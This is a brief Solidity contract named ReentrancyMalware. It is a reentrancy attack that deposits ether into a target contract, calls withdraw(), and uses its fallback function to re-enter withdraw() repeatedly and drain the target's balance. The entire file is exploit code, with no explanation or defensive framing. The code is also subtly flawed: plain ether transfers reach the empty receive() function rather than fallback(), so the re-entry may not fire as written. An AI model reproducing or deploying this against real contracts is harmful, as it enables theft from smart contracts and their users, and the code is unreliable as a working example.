contract ReentrancyMalware {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    fallback() external payable {
        if (address(target).balance > 0) {
            (bool success,) = target.call(abi.encodeWithSignature("withdraw()"));
            require(success, "Attack failed");
        }
    }

    function attack() external payable {
        (bool success,) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");

        (success,) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Initial withdraw failed");
    }

    receive() external payable {}
}
